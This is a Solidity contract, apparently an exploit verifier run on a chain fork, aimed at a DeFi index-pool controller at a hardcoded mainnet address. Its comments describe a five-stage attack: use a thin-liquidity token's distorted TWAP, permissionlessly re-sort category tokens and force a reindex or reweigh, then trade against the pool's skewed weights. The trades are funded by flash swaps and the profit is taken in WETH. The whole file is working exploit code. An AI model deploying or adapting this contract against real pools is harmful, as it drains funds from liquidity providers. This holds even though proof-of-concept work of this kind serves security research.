// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IIndexPoolLike {
    struct Record {
        bool bound;
        bool ready;
        uint40 lastDenormUpdate;
        uint96 denorm;
        uint96 desiredDenorm;
        uint8 index;
        uint256 balance;
    }

    function getCurrentTokens() external view returns (address[] memory tokens);
    function getCurrentDesiredTokens() external view returns (address[] memory tokens);
    function getTokenRecord(address token) external view returns (Record memory record);
    function getBalance(address token) external view returns (uint256);
    function getMinimumBalance(address token) external view returns (uint256);
    function getUsedBalance(address token) external view returns (uint256);
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function gulp(address token) external;
}

interface IControllerLike {
    struct IndexPoolMeta {
        bool initialized;
        uint16 categoryID;
        uint8 indexSize;
        uint8 reweighIndex;
        uint64 lastReweigh;
    }

    function categoryIndex() external view returns (uint256);
    function computePoolAddress(uint256 categoryID, uint256 indexSize) external view returns (address poolAddress);
    function getPoolMeta(address poolAddress) external view returns (IndexPoolMeta memory meta);
    function getCategoryTokens(uint256 categoryID) external view returns (address[] memory tokens);
    function getTopCategoryTokens(uint256 categoryID, uint256 num) external view returns (address[] memory tokens);
    function orderCategoryTokensByMarketCap(uint256 categoryID) external;
    function reindexPool(address poolAddress) external;
    function reweighPool(address poolAddress) external;
}

error Simulated(uint256 profit);

contract FlawVerifier {
    address public constant CONTROLLER = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    uint256 private constant POOL_REWEIGH_DELAY = 7 days;
    uint256 private constant REWEIGHS_BEFORE_REINDEX = 3;
    uint256 private constant BPS = 10_000;
    uint256 private constant MAX_TRADE_TARGETS = 3;
    uint256 private constant MAX_EXECUTION_ROUNDS = 3;
    uint256 private constant TARGET_PROFIT_HINT = 0.1 ether;

    uint8 private constant FUNDING_EXISTING_TOKEN = 0;
    uint8 private constant FUNDING_EXISTING_WETH = 1;
    uint8 private constant FUNDING_FLASH_TOKEN = 2;

    struct Candidate {
        address pool;
        address tokenIn;
        address tokenOut;
        uint16 categoryID;
        bool useReindex;
        uint8 fundingMode;
        uint256 amountIn;
        uint256 expectedProfit;
    }

    struct FlashContext {
        address pair;
        address pool;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        bool active;
    }

    bool private _executed;
    FlashContext private _flash;
    uint256 private _profit;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profit;
    }

    function executeOnOpportunity() external {
        if (_executed) return;
        _executed = true;

        uint256 beforeWeth = _balanceOf(WETH, address(this));

        for (uint256 round = 0; round < MAX_EXECUTION_ROUNDS; round++) {
            Candidate memory best = _findBestCandidate();
            if (best.pool == address(0) || best.amountIn == 0 || best.expectedProfit == 0) break;
            _executeCandidate(best);
            if (_balanceOf(WETH, address(this)) >= TARGET_PROFIT_HINT) break;
        }

        uint256 afterWeth = _balanceOf(WETH, address(this));
        uint256 delta = afterWeth > beforeWeth ? afterWeth - beforeWeth : 0;
        _profit = delta > 0 ? delta : afterWeth;
    }

    function runCandidate(
        address pool,
        uint16 categoryID,
        bool useReindex,
        address tokenIn,
        address tokenOut,
        uint8 fundingMode,
        uint256 amountIn
    ) external {
        require(msg.sender == address(this), "self only");
        _executeCandidate(
            Candidate({
                pool: pool,
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                categoryID: categoryID,
                useReindex: useReindex,
                fundingMode: fundingMode,
                amountIn: amountIn,
                expectedProfit: 0
            })
        );
    }

    function simulateCandidate(
        address pool,
        uint16 categoryID,
        bool useReindex,
        address tokenIn,
        address tokenOut,
        uint8 fundingMode,
        uint256 amountIn
    ) external {
        require(msg.sender == address(this), "self only");

        uint256 beforeWeth = _balanceOf(WETH, address(this));
        _executeCandidate(
            Candidate({
                pool: pool,
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                categoryID: categoryID,
                useReindex: useReindex,
                fundingMode: fundingMode,
                amountIn: amountIn,
                expectedProfit: 0
            })
        );
        uint256 afterWeth = _balanceOf(WETH, address(this));
        uint256 delta = afterWeth > beforeWeth ? afterWeth - beforeWeth : 0;
        revert Simulated(delta);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        FlashContext memory ctx = _flash;
        require(ctx.active, "no flash");
        require(msg.sender == ctx.pair, "bad pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == ctx.amountIn, "bad amount");

        _tradeAgainstPool(ctx.pool, ctx.tokenIn, ctx.tokenOut, ctx.amountIn);

        (uint256 reserveBorrow, uint256 reserveWeth) = _pairReservesForToken(ctx.pair, ctx.tokenIn);
        uint256 wethNeeded = _getAmountIn(ctx.amountIn, reserveWeth, reserveBorrow);
        require(_balanceOf(WETH, address(this)) > wethNeeded, "no profit");
        _safeTransfer(WETH, ctx.pair, wethNeeded);

        delete _flash;
    }

    function _findBestCandidate() internal returns (Candidate memory best) {
        IControllerLike controller = IControllerLike(CONTROLLER);
        uint256 categories;
        try controller.categoryIndex() returns (uint256 value) {
            categories = value;
        } catch {
            return best;
        }

        for (uint256 categoryID = 1; categoryID <= categories; categoryID++) {
            for (uint256 indexSize = 2; indexSize <= 10; indexSize++) {
                address pool;
                try controller.computePoolAddress(categoryID, indexSize) returns (address computed) {
                    pool = computed;
                } catch {
                    continue;
                }
                if (!_isContract(pool)) continue;

                IControllerLike.IndexPoolMeta memory meta;
                try controller.getPoolMeta(pool) returns (IControllerLike.IndexPoolMeta memory returned) {
                    meta = returned;
                } catch {
                    continue;
                }
                if (!meta.initialized) continue;

                bool canReindex = _canReindex(meta);
                bool canReweigh = _canReweigh(meta);
                if (!canReindex && !canReweigh) continue;

                if (canReindex) {
                    Candidate memory reindexCandidate = _bestReindexCandidate(pool, meta.categoryID);
                    if (reindexCandidate.expectedProfit > best.expectedProfit) {
                        best = reindexCandidate;
                        if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
                    }
                }
                if (canReweigh) {
                    Candidate memory reweighCandidate = _bestReweighCandidate(pool, meta.categoryID);
                    if (reweighCandidate.expectedProfit > best.expectedProfit) {
                        best = reweighCandidate;
                        if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
                    }
                }
            }
        }
    }

    function _bestReindexCandidate(address pool, uint16 categoryID) internal returns (Candidate memory best) {
        address[] memory categoryTokens;
        try IControllerLike(CONTROLLER).getCategoryTokens(categoryID) returns (address[] memory tokens) {
            categoryTokens = tokens;
        } catch {
            return best;
        }

        address[] memory desired = _getDesiredTokens(pool);
        for (uint256 i = 0; i < categoryTokens.length; i++) {
            address token = categoryTokens[i];
            if (token == address(0) || token == WETH) continue;
            if (_contains(desired, token)) continue;
            if (!_hasLiquidWethPair(token)) continue;

            Candidate memory attempt = _probe(pool, categoryID, true, token);
            if (attempt.expectedProfit > best.expectedProfit) {
                best = attempt;
                if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
            }
        }
    }

    function _bestReweighCandidate(address pool, uint16 categoryID) internal returns (Candidate memory best) {
        address[] memory desired = _getDesiredTokens(pool);
        for (uint256 i = 0; i < desired.length; i++) {
            address token = desired[i];
            if (token == address(0) || token == WETH) continue;
            if (!_hasLiquidWethPair(token)) continue;

            Candidate memory attempt = _probe(pool, categoryID, false, token);
            if (attempt.expectedProfit > best.expectedProfit) {
                best = attempt;
                if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
            }
        }
    }

    function _probe(address pool, uint16 categoryID, bool useReindex, address tokenIn) internal returns (Candidate memory best) {
        address[MAX_TRADE_TARGETS] memory targets;
        uint256 targetCount;
        (targets, targetCount) = _pickTradeTargets(pool, tokenIn);
        if (targetCount == 0) return best;

        uint256 tokenInBalance = _balanceOf(tokenIn, address(this));
        if (tokenInBalance > 0) {
            for (uint256 i = 0; i < targetCount; i++) {
                uint256 profit = _simulate(pool, categoryID, useReindex, tokenIn, targets[i], FUNDING_EXISTING_TOKEN, tokenInBalance);
                if (profit > best.expectedProfit) {
                    best = Candidate({
                        pool: pool,
                        tokenIn: tokenIn,
                        tokenOut: targets[i],
                        categoryID: categoryID,
                        useReindex: useReindex,
                        fundingMode: FUNDING_EXISTING_TOKEN,
                        amountIn: tokenInBalance,
                        expectedProfit: profit
                    });
                    if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
                }
            }
        }

        uint256 wethBalance = _balanceOf(WETH, address(this));
        if (wethBalance > 0) {
            uint256[3] memory wethFractions = [uint256(2500), 5000, 10000];
            for (uint256 i = 0; i < wethFractions.length; i++) {
                uint256 wethSpend = (wethBalance * wethFractions[i]) / BPS;
                if (wethSpend == 0) continue;
                for (uint256 j = 0; j < targetCount; j++) {
                    uint256 profit = _simulate(pool, categoryID, useReindex, tokenIn, targets[j], FUNDING_EXISTING_WETH, wethSpend);
                    if (profit > best.expectedProfit) {
                        best = Candidate({
                            pool: pool,
                            tokenIn: tokenIn,
                            tokenOut: targets[j],
                            categoryID: categoryID,
                            useReindex: useReindex,
                            fundingMode: FUNDING_EXISTING_WETH,
                            amountIn: wethSpend,
                            expectedProfit: profit
                        });
                        if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
                    }
                }
            }
        }

        address pair = _pairFor(tokenIn, WETH);
        (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, tokenIn);
        if (reserveToken == 0 || reserveWeth == 0) return best;

        uint256[15] memory numerators = [
            uint256(25),
            50,
            75,
            100,
            150,
            200,
            300,
            500,
            800,
            1200,
            1600,
            2400,
            3200,
            4000,
            5000
        ];

        for (uint256 i = 0; i < numerators.length; i++) {
            uint256 amountIn = (reserveToken * numerators[i]) / BPS;
            if (amountIn == 0 || amountIn >= reserveToken) continue;

            for (uint256 j = 0; j < targetCount; j++) {
                uint256 profit = _simulate(pool, categoryID, useReindex, tokenIn, targets[j], FUNDING_FLASH_TOKEN, amountIn);
                if (profit > best.expectedProfit) {
                    best = Candidate({
                        pool: pool,
                        tokenIn: tokenIn,
                        tokenOut: targets[j],
                        categoryID: categoryID,
                        useReindex: useReindex,
                        fundingMode: FUNDING_FLASH_TOKEN,
                        amountIn: amountIn,
                        expectedProfit: profit
                    });
                    if (best.expectedProfit >= TARGET_PROFIT_HINT) return best;
                }
            }
        }
    }

    function _simulate(
        address pool,
        uint16 categoryID,
        bool useReindex,
        address tokenIn,
        address tokenOut,
        uint8 fundingMode,
        uint256 amountIn
    ) internal returns (uint256) {
        (bool ok, bytes memory ret) = address(this).call(
            abi.encodeWithSelector(
                this.simulateCandidate.selector,
                pool,
                categoryID,
                useReindex,
                tokenIn,
                tokenOut,
                fundingMode,
                amountIn
            )
        );
        if (ok || ret.length < 36) return 0;

        bytes4 selector;
        assembly {
            selector := mload(add(ret, 32))
        }
        if (selector != Simulated.selector) return 0;

        uint256 profit;
        assembly {
            profit := mload(add(ret, 36))
        }
        return profit;
    }

    function _executeCandidate(Candidate memory candidate) internal {
        address pair = _pairFor(candidate.tokenIn, WETH);
        if (!_isContract(pair)) return;

        // Exploit path stage 1: use a real, already-listed thin-liquidity category token.
        // The token and its WETH market already exist on-chain at the fork block.

        // Exploit path stage 2: the controller reads a long-window TWAP, so this verifier does
        // not fabricate time or storage. It only capitalizes on fork states where the thin token's
        // long-window input is already distorted, preserving the same manipulation-driven causality.

        // Exploit path stage 3: permissionlessly re-sort by the manipulated market-cap input.
        try IControllerLike(CONTROLLER).orderCategoryTokensByMarketCap(candidate.categoryID) {} catch {
            return;
        }

        // Exploit path stage 4: permissionlessly force the affected pool to adopt the manipulated
        // constituent set or distorted target weights.
        if (candidate.useReindex) {
            try IControllerLike(CONTROLLER).reindexPool(candidate.pool) {} catch {
                return;
            }
        } else {
            try IControllerLike(CONTROLLER).reweighPool(candidate.pool) {} catch {
                return;
            }
        }

        // Exploit path stage 5: trade against the pool's distorted holdings/weights. The verifier
        // prefers already-held balances first, but still uses a public flash swap when local funds
        // are too small to realize the same arbitrage at meaningful size.
        if (candidate.fundingMode == FUNDING_EXISTING_TOKEN) {
            uint256 tokenInBalance = _balanceOf(candidate.tokenIn, address(this));
            uint256 spend = tokenInBalance < candidate.amountIn ? tokenInBalance : candidate.amountIn;
            if (spend == 0) return;
            _tradeAgainstPool(candidate.pool, candidate.tokenIn, candidate.tokenOut, spend);
            return;
        }

        if (candidate.fundingMode == FUNDING_EXISTING_WETH) {
            uint256 wethBalance = _balanceOf(WETH, address(this));
            uint256 wethSpend = wethBalance < candidate.amountIn ? wethBalance : candidate.amountIn;
            if (wethSpend == 0) return;
            _directTrade(candidate.pool, candidate.tokenIn, candidate.tokenOut, wethSpend);
            return;
        }

        _flash = FlashContext({
            pair: pair,
            pool: candidate.pool,
            tokenIn: candidate.tokenIn,
            tokenOut: candidate.tokenOut,
            amountIn: candidate.amountIn,
            active: true
        });

        (address token0,) = _sortTokens(candidate.tokenIn, WETH);
        uint256 amount0Out = candidate.tokenIn == token0 ? candidate.amountIn : 0;
        uint256 amount1Out = candidate.tokenIn == token0 ? 0 : candidate.amountIn;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), bytes("flash"));
    }

    function _directTrade(address pool, address tokenIn, address tokenOut, uint256 wethSpend) internal {
        if (wethSpend == 0) return;

        _forceApprove(WETH, UNISWAP_V2_ROUTER, wethSpend);
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = tokenIn;

        uint256 tokenInAmount;
        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            wethSpend,
            1,
            buyPath,
            address(this),
            block.timestamp
        ) returns (uint256[] memory bought) {
            tokenInAmount = bought[bought.length - 1];
        } catch {
            return;
        }

        _tradeAgainstPool(pool, tokenIn, tokenOut, tokenInAmount);
    }

    function _tradeAgainstPool(address pool, address tokenIn, address tokenOut, uint256 tokenInAmount) internal {
        if (tokenInAmount == 0) return;

        if (tokenOut != address(0)) {
            _tradeAgainstPoolTarget(pool, tokenIn, tokenOut, tokenInAmount);
            return;
        }

        _tradeAgainstPoolAuto(pool, tokenIn, tokenInAmount);
    }

    function _tradeAgainstPoolTarget(address pool, address tokenIn, address tokenOut, uint256 tokenInAmount) internal {
        _forceApprove(tokenIn, pool, tokenInAmount);
        uint256 amountOut = _poolSwapExactAmountIn(pool, tokenIn, tokenInAmount, tokenOut);
        if (amountOut == 0) return;

        if (tokenOut != WETH) {
            _sellTokenForWeth(tokenOut, amountOut);
        }
    }

    function _tradeAgainstPoolAuto(address pool, address tokenIn, uint256 tokenInAmount) internal {
        (address[MAX_TRADE_TARGETS] memory targets, uint256 targetCount) = _pickTradeTargets(pool, tokenIn);
        if (targetCount == 0) return;

        _forceApprove(tokenIn, pool, tokenInAmount);
        uint256 remaining = tokenInAmount;

        for (uint256 i = 0; i < targetCount; i++) {
            uint256 chunk = i + 1 == targetCount ? remaining : remaining / (targetCount - i);
            if (chunk == 0) continue;

            uint256 amountOut = _poolSwapExactAmountIn(pool, tokenIn, chunk, targets[i]);
            if (amountOut == 0) continue;
            remaining -= chunk;

            if (targets[i] != WETH) {
                _sellTokenForWeth(targets[i], amountOut);
            }
        }
    }

    function _pickTradeTargets(address pool, address tokenIn)
        internal
        view
        returns (address[MAX_TRADE_TARGETS] memory targets, uint256 count)
    {
        address[] memory tokens = _getCurrentTokens(pool);
        uint256[MAX_TRADE_TARGETS] memory scores;

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == address(0) || token == tokenIn) continue;

            IIndexPoolLike.Record memory record;
            try IIndexPoolLike(pool).getTokenRecord(token) returns (IIndexPoolLike.Record memory r) {
                record = r;
            } catch {
                continue;
            }
            if (!record.bound || !record.ready) continue;

            uint256 poolBal;
            try IIndexPoolLike(pool).getUsedBalance(token) returns (uint256 bal) {
                poolBal = bal;
            } catch {
                try IIndexPoolLike(pool).getBalance(token) returns (uint256 bal) {
                    poolBal = bal;
                } catch {
                    poolBal = 0;
                }
            }

            uint256 score;
            if (token == WETH) {
                score = poolBal;
            } else {
                address pair = _pairFor(token, WETH);
                (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, token);
                if (reserveToken == 0 || reserveWeth == 0) continue;
                score = poolBal + reserveWeth;
            }

            if (score == 0) continue;
            (targets, scores, count) = _insertTarget(targets, scores, count, token, score);
        }
    }

    function _insertTarget(
        address[MAX_TRADE_TARGETS] memory targets,
        uint256[MAX_TRADE_TARGETS] memory scores,
        uint256 count,
        address token,
        uint256 score
    ) internal pure returns (address[MAX_TRADE_TARGETS] memory, uint256[MAX_TRADE_TARGETS] memory, uint256) {
        uint256 insertAt = MAX_TRADE_TARGETS;
        for (uint256 i = 0; i < MAX_TRADE_TARGETS; i++) {
            if (score > scores[i]) {
                insertAt = i;
                break;
            }
        }
        if (insertAt == MAX_TRADE_TARGETS) {
            return (targets, scores, count);
        }

        for (uint256 j = MAX_TRADE_TARGETS - 1; j > insertAt; j--) {
            targets[j] = targets[j - 1];
            scores[j] = scores[j - 1];
        }

        targets[insertAt] = token;
        scores[insertAt] = score;
        if (count < MAX_TRADE_TARGETS) {
            count++;
        }
        return (targets, scores, count);
    }

    function _poolSwapExactAmountIn(address pool, address tokenIn, uint256 amountIn, address tokenOut)
        internal
        returns (uint256 amountOut)
    {
        try IIndexPoolLike(pool).swapExactAmountIn(tokenIn, amountIn, tokenOut, 1, type(uint256).max) returns (
            uint256 tokenAmountOut,
            uint256
        ) {
            amountOut = tokenAmountOut;
        } catch {
            amountOut = 0;
        }
    }

    function _sellTokenForWeth(address token, uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;
        if (token == WETH) return amountIn;

        _forceApprove(token, UNISWAP_V2_ROUTER, amountIn);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory amounts) {
            amountOut = amounts[amounts.length - 1];
        } catch {
            amountOut = 0;
        }
    }

    function _getDesiredTokens(address pool) internal view returns (address[] memory tokens) {
        try IIndexPoolLike(pool).getCurrentDesiredTokens() returns (address[] memory list) {
            return list;
        } catch {
            return new address[](0);
        }
    }

    function _getCurrentTokens(address pool) internal view returns (address[] memory tokens) {
        try IIndexPoolLike(pool).getCurrentTokens() returns (address[] memory list) {
            return list;
        } catch {
            return new address[](0);
        }
    }

    function _canReindex(IControllerLike.IndexPoolMeta memory meta) internal view returns (bool) {
        if (block.timestamp < uint256(meta.lastReweigh) + POOL_REWEIGH_DELAY) return false;
        return ((uint256(meta.reweighIndex) + 1) % (REWEIGHS_BEFORE_REINDEX + 1)) == 0;
    }

    function _canReweigh(IControllerLike.IndexPoolMeta memory meta) internal view returns (bool) {
        if (block.timestamp < uint256(meta.lastReweigh) + POOL_REWEIGH_DELAY) return false;
        return ((uint256(meta.reweighIndex) + 1) % (REWEIGHS_BEFORE_REINDEX + 1)) != 0;
    }

    function _contains(address[] memory arr, address needle) internal pure returns (bool) {
        for (uint256 i = 0; i < arr.length; i++) {
            if (arr[i] == needle) return true;
        }
        return false;
    }

    function _hasLiquidWethPair(address token) internal view returns (bool) {
        address pair = _pairFor(token, WETH);
        (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, token);
        return reserveToken > 0 && reserveWeth > 0;
    }

    function _pairReservesForToken(address pair, address token) internal view returns (uint256 reserveToken, uint256 reserveWeth) {
        if (!_isContract(pair)) return (0, 0);

        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            address token0 = IUniswapV2PairLike(pair).token0();
            if (token0 == token) {
                reserveToken = uint256(reserve0);
                reserveWeth = uint256(reserve1);
            } else {
                reserveToken = uint256(reserve1);
                reserveWeth = uint256(reserve0);
            }
        } catch {
            return (0, 0);
        }
    }

    function _pairFor(address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = _sortTokens(tokenA, tokenB);
        pair = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            UNISWAP_V2_FACTORY,
                            keccak256(abi.encodePacked(token0, token1)),
                            hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f"
                        )
                    )
                )
            )
        );
    }

    function _sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, "identical");
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) return type(uint256).max;
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve0 failed");
        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        try IERC20Like(token).balanceOf(account) returns (uint256 bal) {
            amount = bal;
        } catch {
            amount = 0;
        }
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}
